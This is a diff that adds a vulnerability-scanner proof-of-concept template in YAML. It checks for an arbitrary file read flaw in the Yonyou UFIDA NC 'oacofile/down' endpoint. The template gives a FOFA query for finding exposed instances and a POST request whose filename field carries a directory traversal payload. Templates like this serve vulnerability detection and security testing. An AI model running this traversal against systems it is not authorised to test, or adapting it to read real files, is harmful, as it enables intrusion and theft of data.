@@ -1,0 +1,21 @@
+id: poc-yaml-yonyou-ufida-nc-oacofile-down-anyfile-read
+info:
+  name: 用友NC oacofile-down 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: ufida-nc
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: GET
+  path: /portal/pt/oacofile/down?pageId=login
+  expression: status_code == 200 && contains(headers,"attachment; filename=") && contains(content_type,"APPLICATION/OCTET-STREAM")
+    && contains(body,"文件下载失败")
+- method: POST
+  path: /portal/pt/oacofile/down?pageId=login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: excelname=test&filename=../../../webapps/nc_web/asdaasdasdwadaafswfwefwadsadadasdsa.txt
+  expression: status_code == 200 && contains(body,"file+not+found")
+variables: {}
+transport: http
